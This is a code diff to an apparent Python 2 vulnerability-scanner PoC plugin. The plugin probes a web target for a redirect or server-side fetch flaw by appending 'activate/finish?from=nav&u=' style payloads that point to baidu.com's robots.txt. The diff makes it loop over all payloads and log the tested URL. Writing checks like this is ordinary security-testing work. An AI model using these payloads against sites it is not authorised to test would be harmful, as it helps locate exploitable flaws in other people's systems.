@@ -32,10 +32,11 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             payloads = ['/user/activate/finish?from=nav&u=','/activate/finish?from=nav&u=','/finish?from=nav&u=']
-            vul_url = arg + payload + 'http://baidu.com/robots.txt'
-            response = requests.get(vul_url)
-            if response.status_code ==200 and 'Baiduspider' in response.content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+            for payload in payloads:
+                vul_url = arg + payload + 'http://baidu.com/robots.txt'
+                response = requests.get(vul_url)
+                if response.status_code ==200 and 'Baiduspider' in response.content:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;vul_url={vul_url}'.format(target=self.target, name=self.vuln.name,vul_url=vul_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
